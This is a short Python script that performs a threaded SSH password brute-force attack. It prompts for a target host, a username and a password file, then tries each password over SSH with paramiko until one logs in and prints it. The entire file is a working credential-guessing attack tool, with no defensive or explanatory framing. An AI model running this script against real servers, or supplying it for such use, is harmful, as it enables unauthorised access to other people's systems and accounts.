import paramiko, sys, os, socket, termcolor
import threading, time
from time import sleep
from progressbar import ProgressBar

stop_flag = 0

def ssh_connect(password):
    global stop_flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)
    try:
        ssh.connect(host, port=22, username=username, password=password)
        stop_flag = 1
        print(termcolor.colored(('[+] Found Password: ' + password + ', For Account: ' + username), 'green'))
    except:
        print(termcolor.colored(('[+] Incorrect Login: ' + password), 'red'))
    ssh.close()

bar=ProgressBar()
for i in bar(range(100)):
    sleep(0.05)

host = input(termcolor.colored(("[+] Target Adress: "), 'yellow'))
username = input(termcolor.colored(("[+] SSH Username: "), 'yellow'))
input_file = input(termcolor.colored(('[+] Passwords File: '), 'yellow'))

if os.path.exists(input_file) == False:
    print("[!!] That File/Path Dosent Exist")
    sys.exit(1)

print(termcolor.colored(('*** Starting Threaded SSH Bruteforce on ' + host + ' With Account: ' + username + '***'), 'yellow'))

with open(input_file, 'r') as file:
    for line in file.readlines():
        if stop_flag == 1:
            t.join()
            exit()
        password = line.strip()
        t = threading.Thread(target=ssh_connect, args=(password,))
        t.start()
        time.sleep(0.5)
